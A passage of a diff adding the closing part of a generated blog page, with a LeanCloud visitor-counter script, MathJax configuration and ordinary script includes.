+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+  <script type="text/javascript" src="/js/src/love.js"></script>
+</body>
+</html>
